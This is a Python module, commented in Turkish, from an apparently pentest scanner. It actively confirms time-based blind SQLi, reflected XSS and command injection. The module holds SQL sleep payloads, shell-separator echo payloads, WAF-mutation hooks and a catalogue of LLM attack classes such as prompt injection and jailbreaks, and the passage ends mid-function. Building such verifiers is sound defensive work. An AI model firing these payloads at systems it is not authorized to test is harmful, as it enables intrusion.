"""
Kadim Güvenlik — PoC Doğrulama Katmanı (§ Pillar #1)
====================================================
Türkçe: Bulunan bir zafiyeti AKTİF olarak yeniden kanıtlar — "tarayıcı"yı "pentester"dan
ayıran katman. nuclei "template eşleşti" der (tahmin/olası false-positive); biz bağımsız
bir yöntemle TEYİT ederiz ve bulguyu `verified=True/False` damgalarız.

İlk yöntem: **zaman-tabanlı blind SQLi**. Hedefe SLEEP(N) enjekte edip yanıt süresinin
enjekte edilen gecikmeyle TUTARLI arttığını ölçeriz. Yavaş/dalgalı bir sunucu bunu üretemez
(delta, kontrol örneklerinin EN YAVAŞINDAN bile enjekte gecikmenin çoğu kadar fazla olmalı)
→ false-positive elenir.

Tasarım: `path_probe.py` deseni — orchestrator-yerli, ayrı servis YOK. Karar çekirdeği SAF
ve izole test edilebilir (test_verification.py); yalnız `verify_time_based_sqli` I/O yapar.
"""

import asyncio
import base64
import binascii
import os
import re
import time
from dataclasses import dataclass
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode

import httpx

from .payload_mutator import apply_mutations, Mutation


# ============================================================
# Sınıf → Evidence metadata tablosu (§5.0-2 — hardcode'u kaldırır)
# ============================================================
# Yeni bir doğrulayıcı eklendiğinde kanıt bulgunun başlığı/severity'si/CWE'si BURADAN gelir;
# önceden _verify_hypotheses'te SQLi'ye sabitlenmişti (XSS bile "SQL Injection" diye
# etiketlenirdi). {param}/{url} şablonları _verify_hypotheses'te doldurulur.
CLASS_EVIDENCE_META: Dict[str, Dict[str, Any]] = {
    "sqli":          {"title": "SQL Injection ({param}) @ {url}",        "severity": "critical", "cwe": ["CWE-89"],   "mitre": "T1190"},
    "xss":           {"title": "Reflected XSS ({param}) @ {url}",        "severity": "high",     "cwe": ["CWE-79"],   "mitre": "T1059.007"},
    "lfi":           {"title": "Local File Inclusion ({param}) @ {url}", "severity": "high",     "cwe": ["CWE-98"],   "mitre": "T1083"},
    "open_redirect": {"title": "Open Redirect ({param}) @ {url}",        "severity": "medium",   "cwe": ["CWE-601"],  "mitre": "T1204"},
    "ssti":          {"title": "Server-Side Template Injection ({param}) @ {url}", "severity": "critical", "cwe": ["CWE-1336"], "mitre": "T1190"},
    # RCE — echo-marker in-band doğrulayıcı (Grup A'ya indirildi; OOB gerektirmez).
    "rce":           {"title": "OS Command Injection ({param}) @ {url}", "severity": "critical", "cwe": ["CWE-78", "CWE-77"], "mitre": "T1059"},
    # T2-B verifier genişletmesi. Severity DİNAMİK (Verdict.severity ezer); buradaki
    # değerler statik varsayılan.
    "cors":          {"title": "CORS Misconfiguration @ {url}",          "severity": "medium",   "cwe": ["CWE-942"],  "mitre": "T1190"},
    "jwt":           {"title": "JWT Weakness @ {url}",                   "severity": "high",     "cwe": ["CWE-347"],  "mitre": "T1550.001"},
    "ssrf":          {"title": "Server-Side Request Forgery ({param}) @ {url}", "severity": "high", "cwe": ["CWE-918"], "mitre": "T1190"},
    "xxe":           {"title": "XML External Entity ({param}) @ {url}",  "severity": "high",     "cwe": ["CWE-611"],  "mitre": "T1190"},
    # ===== AI/LLM red-team doğrulayıcıları (Faz A) — OWASP LLM Top10 + MITRE ATLAS =====
    # Kanıt oracle'ı llm_redteam.py'dedir (marker yansıması / OAST callback / amplifikasyon).
    "prompt_injection":          {"title": "LLM Prompt Injection @ {url}",        "severity": "high",   "cwe": ["CWE-1427"], "mitre": "AML.T0051"},
    "indirect_prompt_injection": {"title": "LLM Indirect Prompt Injection @ {url}", "severity": "high", "cwe": ["CWE-1427"], "mitre": "AML.T0051"},
    "system_prompt_leak":        {"title": "LLM System-Prompt Leak @ {url}",      "severity": "medium", "cwe": ["CWE-200"],  "mitre": "AML.T0056"},
    "output_handling":           {"title": "LLM Improper Output Handling @ {url}", "severity": "medium", "cwe": ["CWE-1426"], "mitre": "AML.T0040"},
    "output_handling_ssrf":      {"title": "LLM Output Handling → SSRF @ {url}",  "severity": "high",   "cwe": ["CWE-1426", "CWE-918"], "mitre": "AML.T0040"},
    "tool_abuse":                {"title": "LLM Tool/Function Abuse @ {url}",     "severity": "high",   "cwe": ["CWE-1426"], "mitre": "AML.T0050"},
    "multiturn_jailbreak":       {"title": "LLM Multi-turn Jailbreak @ {url}",    "severity": "high",   "cwe": ["CWE-1427"], "mitre": "AML.T0054"},
    "denial_of_wallet":          {"title": "LLM Denial-of-Wallet @ {url}",        "severity": "medium", "cwe": ["CWE-1426"], "mitre": "AML.T0040"},
}

# Tabloda olmayan sınıf için güvenli varsayılan (yeni sınıf eklenip meta unutulursa yanlış
# etiket basmak yerine sınıf adıyla işaretlenir — hardcode SQLi felaketinin koruyucusu).
_DEFAULT_EVIDENCE_META: Dict[str, Any] = {
    "title": "{class} ({param}) @ {url}", "severity": "high", "cwe": [], "mitre": None,
}


def evidence_meta_for(vuln_class: str) -> Dict[str, Any]:
    """Sınıfın Evidence metadata'sını döndür (bilinmeyen sınıfta güvenli varsayılan)."""
    return CLASS_EVIDENCE_META.get(str(vuln_class or ""), _DEFAULT_EVIDENCE_META)


@dataclass
class Verdict:
    """Grup A doğrulayıcılarının (lfi/open_redirect/ssti) ortak sonuç tipi.
    SqliVerdict/XssVerdict ile aynı alan sözleşmesi (duck-type) — _verify_hypotheses
    yalnız verified/confidence/method/detail kullanır.
    `mutation`: kanıt bir WAF-mutasyonuyla elde edildiyse mutasyon adı (ör. 'double_encode')
    — pipeline bunu waf_bypass dersi olarak hafızaya yazar (öğrenen döngü).
    `skipped`: deneme GEREKÇELİ test-edilemedi (parametre yok / doğrulayıcı yok). verified=False
    (tried-and-failed) ile KARIŞTIRILMAMALI — pipeline 'atlandı' diye verified'ı False yapmaz."""
    verified: bool
    confidence: float
    method: str
    detail: str
    mutation: Optional[str] = None
    skipped: bool = False
    # T2-B: bazı sınıfların severity'si DİNAMİKTİR (CORS reflected+creds=high vs medium;
    # JWT cracked-secret=critical vs alg-none=high). Doluysa çağıran bunu kullanır; boşsa
    # CLASS_EVIDENCE_META'daki statik severity geçerli (eski verifier'lar aynen çalışır).
    severity: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        return {"verified": self.verified, "confidence": round(self.confidence, 2),
                "method": self.method, "detail": self.detail, "mutation": self.mutation,
                "skipped": self.skipped, "severity": self.severity}


# ============================================================
# Karar çekirdeği (SAF — TDD)
# ============================================================

@dataclass
class TimingSample:
    """Tek bir ölçüm: enjekte edilen SLEEP gecikmesi (sn) + gözlenen yanıt süresi (ms).
    injected_delay_s == 0 → kontrol (payload'sız/gecikmesiz) örnek."""
    injected_delay_s: float
    elapsed_ms: float


@dataclass
class SqliVerdict:
    verified: bool
    confidence: float          # 0.0-1.0 — en zayıf örneğin yansıma oranı
    method: str
    detail: str
    mutation: Optional[str] = None   # kanıt WAF-mutasyonuyla geldiyse adı (öğrenen döngü)
    skipped: bool = False            # FAQ 1.6: parametre yok → test EDİLEMEDİ (tried değil)

    def to_dict(self) -> Dict[str, Any]:
        return {"verified": self.verified, "confidence": round(self.confidence, 2),
                "method": self.method, "detail": self.detail, "mutation": self.mutation,
                "skipped": self.skipped}


# Enjekte gecikmenin en az bu oranı yanıt süresine yansımalı (jitter'a karşı temkin payı).
_CONFIRM_RATIO = 0.6


def confirm_time_based_sqli(
    samples: List[TimingSample],
    *,
    confirm_ratio: float = _CONFIRM_RATIO,
    min_controls: int = 1,
    min_delayed: int = 1,
) -> SqliVerdict:
    """Zamanlama ölçümlerinden zaman-tabanlı blind SQLi teyidi.

    Kural: HER gecikmeli örnek, kontrollerin EN YAVAŞINDAN, enjekte gecikmenin
    `confirm_ratio` katı kadar fazla olmalı (tutarlılık + jitter direnci). Böylece zaten
    yavaş/dalgalı bir sunucu (yüksek kontrol süresi) yanlışlıkla 'doğrulandı' sayılmaz.
    """
    controls = [s.elapsed_ms for s in samples if s.injected_delay_s <= 0]
    delayed = [s for s in samples if s.injected_delay_s > 0]
    if len(controls) < min_controls or len(delayed) < min_delayed:
        return SqliVerdict(False, 0.0, "time-based-blind-sqli", "yetersiz ölçüm")

    max_control = max(controls)
    ratios: List[float] = []
    all_ok = True
    for s in delayed:
        injected_ms = s.injected_delay_s * 1000.0
        observed_delta = s.elapsed_ms - max_control
        ratio = observed_delta / injected_ms if injected_ms > 0 else 0.0
        ratios.append(ratio)
        if observed_delta < injected_ms * confirm_ratio:
            all_ok = False

    weakest = min(ratios) if ratios else 0.0
    confidence = max(0.0, min(1.0, weakest))
    if all_ok:
        detail = (f"SLEEP enjeksiyonu yanıt süresine tutarlı yansıdı "
                  f"(kontrol≈{max_control:.0f}ms, gecikme farkı ~%{weakest*100:.0f} yansıma). "
                  f"Zaman-tabanlı blind SQLi TEYİT edildi.")
        return SqliVerdict(True, confidence, "time-based-blind-sqli", detail)
    return SqliVerdict(
        False, confidence, "time-based-blind-sqli",
        f"Enjekte gecikme yanıt süresine tutarlı yansımadı (yansıma ~%{weakest*100:.0f}) "
        f"— muhtemel false-positive, doğrulanmadı.",
    )


def looks_like_sqli(evidence: Dict[str, Any]) -> bool:
    """Bir kanıt (Evidence.to_dict) zaman-tabanlı SQLi doğrulamasına ADAY mı?
    CWE-89 / başlık-proof'ta 'sql injection'|'sqli' / mitre imzasına bakar."""
    cwe = evidence.get("cwe") or []
    if any("89" in str(c) for c in (cwe if isinstance(cwe, list) else [cwe])):
        return True
    hay = " ".join(str(evidence.get(k, "")) for k in ("title", "proof", "mitre")).lower()
    return "sql injection" in hay or "sqli" in hay or "sql-injection" in hay


# CWE → doğrulanabilir zafiyet sınıfı. Aktif doğrulayıcısı OLAN sınıflar (verify_hypothesis).
_CWE_TO_CLASS = {
    "89": "sqli",
    "79": "xss",
    "98": "lfi", "22": "lfi",
    "601": "open_redirect",
    "1336": "ssti",
    # RCE / komut enjeksiyonu (CWE-78 OS komut, CWE-77 komut enjeksiyonu) — echo-marker.
    "78": "rce", "77": "rce",
    # T2-B
    "942": "cors",
    "347": "jwt", "345": "jwt",
    "918": "ssrf",
    "611": "xxe",
}

# Başlık/anahtar-kelime → sınıf (CWE yoksa yedek). Sıra önemli (özelden gunele).
_KEYWORD_TO_CLASS = [
    ("sql injection", "sqli"), ("sql-injection", "sqli"), ("sqli", "sqli"),
    ("cross-site scripting", "xss"), ("cross site scripting", "xss"), ("xss", "xss"),
    ("local file inclusion", "lfi"), ("path traversal", "lfi"),
    ("directory traversal", "lfi"), ("lfi", "lfi"),
    ("open redirect", "open_redirect"), ("open-redirect", "open_redirect"),
    ("server-side template injection", "ssti"), ("template injection", "ssti"), ("ssti", "ssti"),
    ("remote code execution", "rce"), ("remote-code-execution", "rce"),
    ("command injection", "rce"), ("os command injection", "rce"), ("rce", "rce"),
    # T2-B
    ("cors misconfiguration", "cors"), ("cross-origin resource sharing", "cors"), ("cors", "cors"),
    ("server-side request forgery", "ssrf"), ("ssrf", "ssrf"),
    ("xml external entity", "xxe"), ("xxe", "xxe"),
    ("jwt", "jwt"), ("json web token", "jwt"),
]


def classify_evidence_class(evidence: Dict[str, Any]) -> Optional[str]:
    """Bir kanıtı (Evidence.to_dict) AKTİF doğrulayıcısı olan bir zafiyet sınıfına eşle.

    Önce CWE (en güvenilir; nuclei classification'dan gelir), yoksa başlık/proof/mitre
    anahtar kelimeleri. Eşleşme yoksa None → bu bulgunun deterministik doğrulayıcısı yok
    (IDOR/BOLA, CSRF vb.), tier 'unconfirmed' kalır. SAF — I/O yok."""
    cwe = evidence.get("cwe") or []
    cwe_list = cwe if isinstance(cwe, list) else [cwe]
    for c in cwe_list:
        digits = "".join(ch for ch in str(c) if ch.isdigit())
        if digits in _CWE_TO_CLASS:
            return _CWE_TO_CLASS[digits]
    hay = " ".join(str(evidence.get(k, "")) for k in ("title", "proof", "mitre")).lower()
    for kw, klass in _KEYWORD_TO_CLASS:
        if kw in hay:
            return klass
    return None


def build_injected_urls(url: str, payload: str) -> List[str]:
    """URL'nin HER sorgu parametresine payload'u ekleyerek aday enjeksiyon URL'leri üret.
    Sorgu parametresi yoksa boş liste (path'e kör enjeksiyon tahmin edilmez)."""
    parts = urlsplit(url)
    params = parse_qsl(parts.query, keep_blank_values=True)
    if not params:
        return []
    out: List[str] = []
    for i in range(len(params)):
        mutated = list(params)
        k, v = mutated[i]
        mutated[i] = (k, f"{v}{payload}")
        new_query = urlencode(mutated)
        out.append(urlunsplit((parts.scheme, parts.netloc, parts.path, new_query, parts.fragment)))
    return out


# ============================================================
# P0-B — HTTP method + GÖVDE kapsamı (POST/PUT/PATCH + form/JSON)
# ============================================================
# Gerçek API zafiyetlerinin çoğu GET sorgusunda DEĞİL, POST/PUT gövdesinde yaşar.
# Bu katman doğrulayıcılara ikinci bir enjeksiyon boyutu ekler: hipotez method+
# body_params taşıyorsa payload sorguya değil GÖVDEYE iner. Karar çekirdekleri
# (confirm_time_based_sqli, imza/marker/arithmetik fonksiyonları) AYNEN kalır —
# değişen yalnız I/O katmanı (hangi istek, hangi parametre nerede).

def body_params_dict(body_params: Any) -> Dict[str, str]:
    """Hipotezin gövde parametrelerini ((ad, değer), ...) tuple'ından dict'e çevir.
    None/boş → boş dict (çağıran 'gövde yok' kararını boşluk üstünden verir)."""
    if not body_params:
        return {}
    out: Dict[str, str] = {}
    try:
        for k, v in body_params:
            name = str(k or "").strip()
            if name:
                out[name] = str(v if v is not None else "")
    except (TypeError, ValueError):
        return {}
    return out


def build_injected_bodies(body_params: Dict[str, str], payload: str, *,
                          replace: bool = False, only_param: Optional[str] = None,
                          max_params: int = 5) -> List[tuple]:
    """Gövde parametrelerine payload enjekte ederek aday gövde varyantları üret (SAF).

    replace=False: payload mevcut değerin SONUNA eklenir (XSS/SSTI/SQLi-append
    bağlamı); replace=True: değer payload ile EZİLİR (LFI/redirect — değerin kendisi
    dosya/yol olmalı). Döner: [(gövde_dict, enjekte_edilen_param), ...] — sorgu
    hattındaki build_injected_urls/_replace_param_urls'un gövde ikizi.
    only_param verilirse yalnız o parametre (LLM hedefi); yoksa max_params tavanı."""
    if not body_params:
        return []
    out: List[tuple] = []
    touched = 0
    for k, v in body_params.items():
        if only_param and k != only_param:
            continue
        if not only_param and touched >= max_params:
            break
        body = dict(body_params)
        body[k] = payload if replace else f"{v}{payload}"
        touched += 1
        out.append((body, k))
    return out


async def _timed_request(client: httpx.AsyncClient, url: str, *, method: str = "GET",
                         form_data: Optional[Dict[str, str]] = None,
                         json_data: Optional[Dict[str, Any]] = None) -> Optional[float]:
    """Method+gövde farkındalıklı zamanlı istek (_timed_get'in genelleştirilmiş hali).
    form_data → application/x-www-form-urlencoded; json_data → application/json.
    Hata → None (kanıt üretmez)."""
    start = time.monotonic()
    try:
        if json_data is not None:
            await client.request(method, url, json=json_data)
        elif form_data is not None:
            await client.request(method, url, data=form_data)
        else:
            await client.request(method, url)
    except Exception:
        return None
    return (time.monotonic() - start) * 1000.0


async def _fetch_body_request(client: httpx.AsyncClient, url: str, *, method: str = "GET",
                              form_data: Optional[Dict[str, str]] = None,
                              json_data: Optional[Dict[str, Any]] = None,
                              max_bytes: int = 64_000) -> Optional[str]:
    """Method+gövde ile istek at, yanıt gövdesinin ilk max_bytes'ını metin olarak döndür
    (_fetch_body'nin genelleştirilmiş hali). 5xx → None (kanıt üretmez)."""
    try:
        if json_data is not None:
            r = await client.request(method, url, json=json_data, timeout=15.0)
        elif form_data is not None:
            r = await client.request(method, url, data=form_data, timeout=15.0)
        else:
            r = await client.request(method, url, timeout=15.0)
        if r.status_code >= 500:
            return None
        return (r.text or "")[:max_bytes]
    except Exception:
        return None


# ============================================================
# Aktif çalıştırıcı (I/O — ince katman)
# ============================================================

# Farklı DB lehçeleri için zaman-tabanlı payload'lar. {D} → gecikme (saniye).
# Yorum satırı kapatma varyantları farklı bağlamları kapsar.
# T4-A: inline liste SAHADA KANITLANMIŞ çekirdektir — silinmez, fallback olarak kalır.
_SQLI_TIME_PAYLOADS_INLINE = [
    "' AND SLEEP({D})-- -",            # MySQL string bağlam
    "'||pg_sleep({D})--",              # PostgreSQL string
    "'; WAITFOR DELAY '0:0:{D}'--",    # MSSQL
    " AND SLEEP({D})",                 # MySQL sayısal bağlam
    "' AND SLEEP({D})='",              # tırnak dengeli
]


def _merge_corpus(klass: str, inline):
    """T4-A: offline-süzülmüş corpus ile genişlet (payload_corpus). HER hata/bayrak
    kapalı → inline kopyası: doğrulama hattı corpus'tan bağımsız çalışmaya devam eder."""
    try:
        from .payload_corpus import merge_with_inline
        return merge_with_inline(klass, inline)
    except Exception:
        return list(inline)


# Timing doğrulaması PAHALI (payload başına ~D sn gecikme, negatifte tamamı denenir) →
# merge tavanı payload_corpus._MERGE_CAPS'te sıkı tutulur (sqli: 8).
_SQLI_TIME_PAYLOADS = _merge_corpus("sqli", _SQLI_TIME_PAYLOADS_INLINE)


# Türkçe: Faz 1f — reflected XSS probu. Tek bir güvenli-benzer "marker" her param'ye
# enjekte edilir; yanıt gövdesinde marker HAM (HTML-escape edilmemiş) geçerse reflected XSS
# teyit edilir. Payload bilinçli olarak 'görsel' DEĞİL, kanıt amaçlı: `<x>` kapanmış etiketi
# tarayıcıda zararsızdır ama zafiyetin VARLIĞINI gösterir (HTML bağlamı kaçışsız).
import secrets as _secrets


def _reflected_xss_marker() -> str:
    """Benzersiz, hedef-bağımsız XSS probe marker'i. Her parametreye eklemede taze
    üretiriz ki yanıtın STALE bir yankı değil, enjekte edilenin TAZE yansıması olsun."""
    nonce = _secrets.token_hex(6)
    # Türkçe: ` Kad1mXss{n} ` + `<x>` etiketi. Marker tespitten sonra da etiket zararsız.
    # Virgül boşluklar URL'i bozmaz. Tarayıcı bu etiketi render eder ama hiçbir şey yapmaz.
    return f"Kad1mXss{nonce}<x>"


async def _fetch_body(client: httpx.AsyncClient, url: str, *, max_bytes: int = 64_000) -> Optional[str]:
    """URL'i GET ile çek, gövdenin ilk max_bytes baytını UTF-8 (errors=replace) metnine çevir.
    Hata olursa None (kanıt üretmez). Boyut sınırı: SPA bundle büyüklüğünde gövdede marker
    aramak pahalı olur; ilk 64KB yeter — XSS reflection genelde header/menu/arama-result
    kısımlarında HEMEN yansır."""
    try:
        r = await client.get(url, timeout=15.0)
        if r.status_code >= 500:
            return None
        # Türkçe: stream değil ama content; httpx zaten tüm gövdeyi indirir. Boyut sınırlamak
        # için .text yerine .iter_bytes() tercih edilir; burada sadelik için text+iç-kırpma.
        text = r.text or ""
        return text[:max_bytes]
    except Exception:
        return None


def _marker_reflected_unescaped(marker: str, body: str) -> bool:
    """Marker gövdede HAM (HTML-escape edilmemiş) geçiyor mu? Eğer `&lt;x&gt;` olarak
    geçiyorsa sunucu escape etmiş demektir → güvenli, bulgu sayılmaz. `Kad1mXss{n}<x>`
    string'ini olduğu gibi bulduğumuzda reflection gerçek'tir."""
    if not body or not marker:
        return False
    # Türkçe: Bizim marker'da `<x>` var. HTML-escape'lenirse `<x>` → `&lt;x&gt;` olur.
    # Marker'ın TAM ham dizesi geçiyorsa: escape başarısız → reflected XSS var.
    return marker in body


@dataclass
class XssVerdict:
    verified: bool
    confidence: float
    method: str
    detail: str
    param: Optional[str] = None
    reflected_url: Optional[str] = None
    mutation: Optional[str] = None   # kanıt WAF-mutasyonuyla geldiyse adı (öğrenen döngü)
    skipped: bool = False            # FAQ 1.6: parametre yok → test EDİLEMEDİ (tried değil)

    def to_dict(self) -> Dict[str, Any]:
        return {"verified": self.verified, "confidence": round(self.confidence, 2),
                "method": self.method, "detail": self.detail, "param": self.param,
                "reflected_url": self.reflected_url, "mutation": self.mutation,
                "skipped": self.skipped}


async def verify_reflected_xss(url: str, client: httpx.AsyncClient,
                               *, mutations: Optional[List[Mutation]] = None,
                               method: str = "get", body_params: Any = None,
                               body_kind: str = "form") -> XssVerdict:
    """Bir URL'deki HER sorgu parametresine XSS probe marker'i enjekte eder; yanıt gövdesinde
    marker HAM (escape edilmemiş) geçerse reflected XSS teyit edilir. İlk yansıyan parametre
    bulgu kaynağı olur. Parametre yoksa doğrulanmaz (path-level kör enjeksiyon yok).
    `mutations` verilirse marker'ın WAF-profilli varyantları da denenir (ör. case_swap —
    HTML etiketi case-insensitive olduğundan PoC bozulmaz, imza kuralı bölünür).

    P0-B: `method` GET değil ve `body_params` doluysa enjeksiyon GÖVDEYE iner
    (form/JSON) — stored/reflected XSS'in API yüzeyindeki gerçek yeri burasıdır.

    GÜVENLİK: payload zararsız etiket `<x>` içerir; tarayıcıda render edilse bile script
    üretmez. Kanıt bağımsız bir metodla toplanır (template anahtarı DEĞİL)."""
    m = (method or "get").lower()
    bparams = body_params_dict(body_params)
    use_body = m in ("post", "put", "patch") and bool(bparams)
    send_json = body_kind == "json"

    if use_body:
        tried = False
        # Her parametre adayı için TAZE marker (nonce) — sorgu hattındaki koruma:
        # yanıtın bayat yankısı değil, enjekte edilenin TAZE yansıması ölçülür.
        for _k in bparams:
            base_marker = _reflected_xss_marker()
            for marker, mut_name in apply_mutations(base_marker, mutations or [], include_identity=not mutations):
                for body, hit_param in build_injected_bodies(bparams, marker, only_param=_k):
                    tried = True
                    body_text = await _fetch_body_request(
                        client, url, method=m.upper(),
                        json_data=body if send_json else None,
                        form_data=None if send_json else body)
                    if body_text is None:
                        continue
                    if _marker_reflected_unescaped(marker, body_text):
                        mut_note = f" [WAF-mutasyonu: {mut_name}]" if mut_name else ""
                        return XssVerdict(
                            True, 0.85, "reflected-xss",
                            f"{m.upper()} gövdesindeki '{hit_param}' parametresine enjekte edilen XSS "
                            f"probe marker'i HTML-escape edilmemiş olarak yanıt gövdesine yansıdı — "
                            f"yansıyan `<x>` etiketi tarayıcıda render edilir. "
                            f"Reflected XSS TEYİT edildi.{mut_note}",
                            param=hit_param, reflected_url=url, mutation=mut_name)
        if not tried:
            return XssVerdict(False, 0.0, "reflected-xss", "Gövde enjeksiyon noktası kurulamadı.",
                              skipped=True)
        return XssVerdict(False, 0.0, "reflected-xss",
                          "Gövde parametrelerinde marker HAM yansımadı — escape sağlam veya "
                          "reflection yok. Muhtemel false-positive, doğrulanmadı.")

    parts = urlsplit(url)
    params = parse_qsl(parts.query, keep_blank_values=True)
    if not params:
        return XssVerdict(False, 0.0, "reflected-xss",
                          "Enjekte edilebilir sorgu parametresi yok — doğrulama atlandı.",
                          skipped=True)

    # Mark'ı her parametreye tek tek ekle; sıradaki parametrelerin değerleri orijinal.
    for i in range(len(params)):
        base_marker = _reflected_xss_marker()
        for marker, mut_name in apply_mutations(base_marker, mutations or [], include_identity=not mutations):
            mutated = list(params)
            k, v = mutated[i]
            # Değerin sonuna ekle (varolan değeri ezme — bağlam neyse aynısı, üzerine ekle).
            mutated[i] = (k, f"{v}{marker}")
            new_query = urlencode(mutated)
            inj_url = urlunsplit((parts.scheme, parts.netloc, parts.path, new_query, parts.fragment))
            body = await _fetch_body(client, inj_url)
            if body is None:
                continue
            if _marker_reflected_unescaped(marker, body):
                mut_note = f" [WAF-mutasyonu: {mut_name}]" if mut_name else ""
                return XssVerdict(
                    True, 0.85, "reflected-xss",
                    f"Parametre '{k}' değerindeki XSS probe marker'i HTML-escape edilmemiş olarak "
                    f"yanıt gövdesine yansıdı — yansıyan `<x>` etiketi tarayıcıda render edilir. "
                    f"Reflected XSS TEYİT edildi.{mut_note}",
                    param=k, reflected_url=inj_url, mutation=mut_name)

    return XssVerdict(False, 0.0, "reflected-xss",
                      "Hiçbir parametrede marker HAM yansımadı — escape sağlam veya "
                      "reflection yok. Muhtemel false-positive, doğrulanmadı.")


# ============================================================
# RCE / komut enjeksiyonu doğrulayıcı — echo-marker (in-band, tahribatsız)
# ============================================================
# KANIT YÖNTEMİ: `; echo Kad1mRce{n}` gibi ayraç+echo payload'u parametreye eklenir;
# komut GERÇEKTEN çalışıyorsa marker STDOUT'a yazılır ve yanıt gövdesinde görünür.
# Payload yalnızca rastgele token YAZDIRIR — dosya/ağ/yan-etki YOK (pen-test etiği:
# kanıt üret, zarar verme). Windows (cmd `&`) ve Unix (`;` `|` `&&` `$()`) ayraçları
# sırayla denenir; her deneme TAZE nonce taşır (bayat yankı = yanlış pozitif riskini keser).

_RCE_MARK_PREFIX = "Kad1mRce"

# Bağlam ayraçları: Unix sh → Windows cmd sırası (en yaygından). {M} → taze marker.
_RCE_WRAPPERS = [
    ";echo {M}",
    "|echo {M}",
    "&&echo {M}",
    "$(echo {M})",
    "&echo {M}",
]


def _rce_marker() -> str:
    """Benzersiz komut-çıktısı marker'i. Her denemede taze üretilir — yanıtta görülen
    marker'ın BU istekten geldiği kesindir (sayfanın kendi içeriği olamaz)."""
    return f"{_RCE_MARK_PREFIX}{_secrets.token_hex(6)}"


async def verify_rce(url: str, param: Optional[str], client: httpx.AsyncClient, *,
                     mutations: Optional[List[Mutation]] = None,
                     method: str = "get", body_params: Any = None,
                     body_kind: str = "form") -> Verdict:
    """Parametre komut enjeksiyonuna açık mı — echo-marker ile in-band doğrula.

    Her sorgu/gövde parametresine ayraç+echo payload'u EKLENİR (değer ezilmez — bağlam
    korunur). Yanıt gövdesinde marker geçiyorsa komut çalışmış demektir → RCE TEYİT.
    `param` verilirse yalnız o parametre (LLM hedefi); yoksa hepsi (tavan: ilk eşleşme).
    Parametre yoksa skipped=True (test EDİLEMEDİ — FP değil)."""
    m = (method or "get").lower()
    bparams = body_params_dict(body_params)
    use_body = m in ("post", "put", "patch") and bool(bparams)
    send_json = body_kind == "json"
    tried = False

    # Gövde hattı: her param adayı × her ayraç sarmalayıcısı.
    if use_body:
        for _k in bparams:
            if param and _k != param:
                continue
            for wrapper in _RCE_WRAPPERS:
                marker = _rce_marker()
                payload = wrapper.replace("{M}", marker)
                for body, hit_param in build_injected_bodies(bparams, payload, only_param=_k):
                    tried = True
                    text = await _fetch_body_request(
                        client, url, method=m.upper(),
                        json_data=body if send_json else None,
                        form_data=None if send_json else body)
                    if text and marker in text:
                        return Verdict(
                            True, 0.9, "rce-echo",
                            f"{m.upper()} gövdesindeki '{hit_param}' parametresine eklenen "
                            f"'{wrapper.split()[0].rstrip()}' ayraçlı echo payload'u SUNUCUDA "
                            f"ÇALIŞTI — rastgele marker ({marker}) komut çıktısında yankılandı. "
                            f"Komut enjeksiyonu (RCE) TEYİT edildi.",
                            severity="critical")
        if not tried:
            return Verdict(False, 0.0, "rce-echo", "Gövde enjeksiyon noktası kurulamadı.",
                           skipped=True)
        return Verdict(False, 0.0, "rce-echo",
                       "Gövde parametrelerinde echo-marker yankılanmadı — komut ayracı "
                       "işlenmedi veya girdi temizleniyor. Doğrulanmadı.")

    # Sorgu hattı: klasik GET (XSS doğrulayıcısıyla aynı iskelet).
    parts = urlsplit(url)
    params = parse_qsl(parts.query, keep_blank_values=True)
    if not params:
        return Verdict(False, 0.0, "rce-echo",
                       "Enjekte edilebilir sorgu parametresi yok — doğrulama atlandı.",
                       skipped=True)
    for i, (k, v) in enumerate(params):
        if param and k != param:
            continue
        for wrapper in _RCE_WRAPPERS:
            marker = _rce_marker()
            payload = wrapper.replace("{M}", marker)
            mutated = list(params)
            mutated[i] = (k, f"{v}{payload}")
            inj = urlunsplit((parts.scheme, parts.netloc, parts.path,
                              urlencode(mutated), parts.fragment))
            text = await _fetch_body(client, inj)
            if text and marker in text:
                return Verdict(
                    True, 0.9, "rce-echo",
                    f"Parametre '{k}' değerine eklenen '{wrapper.split()[0].rstrip()}' ayraçlı "
                    f"echo payload'u SUNUCUDA ÇALIŞTI — rastgele marker ({marker}) komut "
                    f"çıktısında yankılandı. Komut enjeksiyonu (RCE) TEYİT edildi.",
                    severity="critical")
    return Verdict(False, 0.0, "rce-echo",
                   "Hiçbir parametrede echo-marker yankılanmadı — komut ayracı işlenmedi "
                   "veya girdi temizleniyor. Muhtemel false-positive, doğrulanmadı.")


async def _timed_get(client: httpx.AsyncClient, url: str) -> Optional[float]:
    """Tek GET at, yanıt süresini ms olarak döndür. Hata olursa None (kanıt üretmez)."""
    start = time.monotonic()
    try:
        await client.get(url)
    except Exception:
        return None
    return (time.monotonic() - start) * 1000.0


async def _confirm_scaled_oracle(
    client: httpx.AsyncClient,
    *,
    template: str,
    mut_name: str,
    mutations: Optional[List[Mutation]],
    delay_seconds: float,
    url: str,
    use_body: bool,
    bparams: Dict[str, str],
    send_json: bool,
    method: str,
) -> Tuple[Optional[bool], float]:
    """İKİNCİ BAĞIMSIZ ZAMAN ORAKLI (FAQ 1.8) — ölçek sabitleme.

    Birinci orakl SLEEP(d) ile gecikme gördü; bu orakl AYNI enjeksiyon noktasına
    SLEEP(2d) gönderip gecikmenin İSTENEN YÖNDE ÖLÇEKLENDİĞİNİ arar. Aksak/yavaş sunucu
    tek-delay testinde rastgele delta üretebilir; ama GERÇEK bir SLEEP 2 katına çıkınca
    yanıt da ~2 katına çıkar (gürültüde böyle sabit ilişki yoktur) → tutarlılık artar,
    en zayıf orakl güveni belirler.

    Döner (verified|None, confidence): None = ölçüm ALINAMADI (ağ hatası) → çağıran
    birinci oraklın kararını korur (sahte düşürme yok)."""
    larger = int(delay_seconds * 2.0)
    base_payload = template.replace("{D}", str(larger))
    # Birinci oraklın KAZANAN payload'unu aynı WAF-mutasyonuyla yeniden kur
    # (duvar varsa aynı varyant geçer — mutasyon listesi orijinal parametreyle aynı).
    scaled_payload = None
    for _pl, _mn in apply_mutations(base_payload, mutations or [], include_identity=not mutations):
        if _mn == mut_name:
            scaled_payload = _pl
            break
    if scaled_payload is None:
        return None, 0.0
    # Kazanan enjeksiyon noktasını (param/body) büyük gecikmeyle yeniden kur.
    if use_body:
        candidates = [(url, method, b2, None) for b2, _ in
                      build_injected_bodies(bparams, scaled_payload)]
    else:
        candidates = [(u, "GET", None, None) for u in build_injected_urls(url, scaled_payload)]
    if not candidates:
        return None, 0.0
